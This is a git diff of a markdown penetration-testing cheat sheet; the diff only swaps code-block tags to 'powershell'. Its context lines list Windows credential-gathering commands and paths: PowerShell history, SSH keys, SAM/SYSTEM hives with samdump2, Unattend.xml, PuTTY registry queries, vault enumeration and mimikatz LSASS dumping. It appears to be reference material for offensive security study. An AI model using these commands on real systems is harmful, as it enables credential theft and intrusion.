@@ -1,6 +1,6 @@
 
 
-```sh
+```powershell 
 
 ##########Credential Gethering 
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -30,12 +30,12 @@ Start-Transcript  -Path "C:\Users\USER\Desktop\Log.txt"
 
 
 > SSH Keys
-```sh
+```powershell
 /Users/Administrator/.ssh/id_rsa
 ```
 
 >LFI detection
-```sh
+```powershell
 /Windows/System32/Drivers/etc/hosts
 /Windows/system.ini
 
@@ -43,13 +43,13 @@ Start-Transcript  -Path "C:\Users\USER\Desktop\Log.txt"
 ```
 
 >  Enumerate vaults
-```
+```powershell
 vaultcmd /list
 ```
 
 
 >SAM and SYSTEM location
-```sh
+```powershell
 
 C:\Windows\system32\config\sam
 C:\Windows\system32\sam
@@ -64,7 +64,7 @@ samdump2 SYSTEM SAM
 
 
 **Credential Gathering Common locations** 
-```
+```powershell
 C:\Unattend.xml  
 C:\Windows\Panther\Unattend.xml  
 C:\Windows\Panther\Unattend\Unattend.xml  
@@ -88,7 +88,7 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 Cached AD credentials:
 In modern versions of Windows, these hashes are stored in the _Local Security Authority Subsystem Service_(LSASS) memory space. LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.
 
-```
+```powershell
 .\mimikatz.exe
 privilege::debug
 sekurlsa::logonpasswords
